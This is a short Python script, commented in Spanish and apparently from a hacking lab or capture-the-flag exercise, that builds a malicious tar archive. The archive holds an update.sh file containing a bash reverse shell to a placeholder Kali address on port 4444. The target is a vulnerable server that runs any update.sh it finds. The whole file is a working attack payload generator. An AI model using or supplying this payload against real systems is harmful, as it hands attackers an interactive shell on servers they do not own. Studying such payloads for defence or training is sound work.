import tarfile
import os

KALI = "<IP_KALI>"   # IP de tu Kali, donde espera el listener
PUERTO = 4444

# Este es el "programa dañino": cuando el servidor lo ejecute, se va a conectar
# de vuelta a nuestra Kali y nos entrega el control (una shell).
payload = f"""#!/bin/bash
bash -i >& /dev/tcp/{KALI}/{PUERTO} 0>&1
"""

os.makedirs("out", exist_ok=True)
with open("out/update.sh", "w", newline="\n") as f:
    f.write(payload)

# Metemos ese programa dentro de un paquete .tar. El servidor vulnerable ejecuta
# solo cualquier "update.sh" que venga adentro, sin revisar nada.
with tarfile.open("out/malicious.tar", "w") as t:
    t.add("out/update.sh", arcname="update.sh")

print("Paquete malicioso creado: out/malicious.tar")
